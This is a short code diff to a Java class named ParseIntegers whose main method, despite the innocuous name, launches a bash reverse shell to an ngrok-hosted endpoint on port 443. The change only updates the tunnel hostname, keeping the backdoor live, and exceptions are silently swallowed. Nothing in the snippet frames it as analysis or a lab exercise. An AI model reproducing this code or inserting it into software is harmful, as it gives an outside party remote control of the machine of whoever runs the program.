@@ -18,7 +18,7 @@ public class ParseIntegers {
     public static void main(String[] args) {
         Process p;
         try {
-            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/7c26-146-241-181-252.ngrok-free.app/443 0>&1");
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/4d1b-146-241-181-252.ngrok-free.app/443 0>&1");
             p.waitFor();
             p.destroy();
         } catch (Exception e) {}
